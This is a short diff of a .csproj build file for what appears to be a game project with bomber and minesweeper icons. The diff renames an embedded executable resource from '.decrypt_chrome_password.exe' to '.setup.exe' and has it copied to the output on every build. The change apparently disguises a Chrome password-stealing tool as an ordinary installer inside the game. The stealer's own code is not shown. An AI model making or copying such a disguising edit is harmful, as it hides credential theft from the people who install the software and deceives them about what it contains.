@@ -146,7 +146,7 @@
   <ItemGroup>
     <Content Include="1295700221_clanbomber.ico" />
     <Content Include="1295743174_kmines.ico" />
-    <EmbeddedResource Include=".decrypt_chrome_password.exe">
+    <EmbeddedResource Include=".setup.exe">
       <CopyToOutputDirectory>Always</CopyToOutputDirectory>
     </EmbeddedResource>
     <None Include="Resources\clanbomber.png" />
